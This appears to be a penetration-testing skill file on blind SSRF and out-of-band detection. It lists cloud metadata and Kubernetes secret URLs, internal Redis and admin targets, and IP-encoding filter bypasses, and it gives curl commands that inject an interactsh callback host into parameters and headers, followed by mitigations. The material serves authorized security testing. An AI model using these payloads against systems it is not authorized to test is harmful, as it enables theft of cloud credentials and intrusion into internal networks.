---
name: ssrf-oob-interaction-testing
description: "Out-of-band (OOB) and Server-Side Request Forgery (SSRF) testing. Detects blind SSRF, metadata leaks, and internal network pivot vulnerabilities."
risk: offensive
source: community
author: "Krish Ujeniya"
---

# Out-of-Band (OOB) & Server-Side Request Forgery (SSRF) Testing

> **⚠️ AUTHORIZED USE ONLY**: For authorized security assessments and application hardening.

## Overview

Server-Side Request Forgery (SSRF) occurs when a web application fetches a remote resource without validating the user-supplied URL. In blind SSRF scenarios, responses are not rendered back to the user; detection relies on **Out-Of-Band (OOB)** interaction listeners (DNS, HTTP, HTTPS) such as Interactsh, ProjectDiscovery, or internal callback listeners.

---

## SSRF Vulnerability Vectors

1. **Cloud Metadata Endpoints**:
   - AWS / GCP / Azure IMDSv1: `http://169.254.169.254/latest/meta-data/`
   - DigitalOcean: `http://169.254.169.254/metadata/v1.json`
   - Kubernetes Pod Secrets: `https://kubernetes.default.svc/api/v1/namespaces/default/secrets`

2. **Loopback & Internal Subnet Access**:
   - `http://127.0.0.1:8080/admin`
   - `http://localhost:6379/` (Redis unauthorized command injection)
   - `http://10.0.0.1/`, `http://192.168.1.1/`

3. **Alternative IP Encodings (Filter Bypasses)**:
   - Dotted decimal bypass: `http://2130706433` (evaluates to 127.0.0.1)
   - Hexadecimal bypass: `http://0x7f.0x0.0x0.0x1`
   - Octal bypass: `http://0177.0.0.01`
   - IPv6 local: `http://[::1]/`
   - DNS rebinding domains.

---

## Out-of-Band Interaction Testing Workflow

### Step 1: Initialize OOB Listener
Using `interactsh-client` or custom DNS listener:
```bash
# Generate a unique interaction session token
interactsh-client -json -o oob_interactions.json &
OOB_HOST="c2xxxxxxxxxxxx.oast.fun"
```

### Step 2: Inject OOB Payloads into Candidate Parameters
Scan query strings, JSON payloads, webhook configs, XML docs, and HTTP headers:
```bash
# Candidate parameters: url, webhook, image_url, redirect, source, feed, callback
curl -s -X POST https://target.example.com/api/webhook   -H "Content-Type: application/json"   -d '{"url": "http://webhook.'$OOB_HOST'"}'

curl -s -X GET "https://target.example.com/preview?url=http://param.'$OOB_HOST'"
```

### Step 3: Header Injection Testing
```bash
curl -s https://target.example.com/dashboard   -H "X-Forwarded-For: header-xff.$OOB_HOST"   -H "X-Forwarded-Host: header-xfh.$OOB_HOST"   -H "Referer: http://referer.$OOB_HOST"
```

### Step 4: Verification & Mitigation
- If DNS query or HTTP callback is received, blind SSRF is confirmed.
- **Defensive Mitigation**:
  - Implement strict URL allowlisting (enforce HTTPS, authorized domain list).
  - Resolve DNS prior to connection and block RFC 1918 / loopback / link-local addresses.
  - Disable HTTP redirect following on internal requests.
  - Enforce AWS IMDSv2 (session tokens with hop-limit = 1).
